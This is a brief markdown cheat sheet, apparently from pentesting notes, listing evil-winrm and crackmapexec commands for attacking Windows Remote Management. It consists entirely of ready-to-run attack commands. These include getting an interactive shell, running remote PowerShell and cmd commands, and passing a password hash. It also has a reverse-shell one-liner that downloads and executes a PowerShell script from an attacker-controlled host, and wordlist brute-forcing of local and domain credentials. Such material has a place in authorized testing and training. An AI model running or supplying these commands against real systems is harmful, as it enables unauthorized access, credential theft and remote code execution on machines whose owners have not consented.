# winrm

Crackmapexec cant provide an interactive shell by itself

## interactive shell with evil-winrm

```bash
evil-winrm -i "$rhost" -u "user" -p "password"
```

## check connection

```bash
crackmapexec winrm $rhost -u Administrator -p <some-password>
```

## run powershell command

```bash
crackmapexec winrm $rhost -u Administrator -p <some-password> -X <whoami>
```

## run cmd powershell command

```bash
crackmapexec winrm $rhost -u Administrator -p <some-password> -x <dir>
```

## reverse shell

```bash
crackmapexec winrm $rhost -u Administrator -p <password> -X "powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://<lhost>:<lport>/reverse-shell/powershell.ps')\""
```

## use hash

```bash
crackmapexec winrm $rhost -u some_user -H "some-hash"
```

## bruteforce creds local user

```bash
crackmapexec winrm $rhost -u wordlist.txt -p wordlist.txt --local-auth --continue-on-success
```

## bruteforce creds domain "none"

```bash
crackmapexec winrm $rhost -u wordlist.txt -p wordlist.txt --continue-on-success
```

## bruteforce creds domain custom

```bash
crackmapexec winrm $rhost -d "yourdomain" -u wordlist.txt -p wordlist.txt --continue-on-success
```
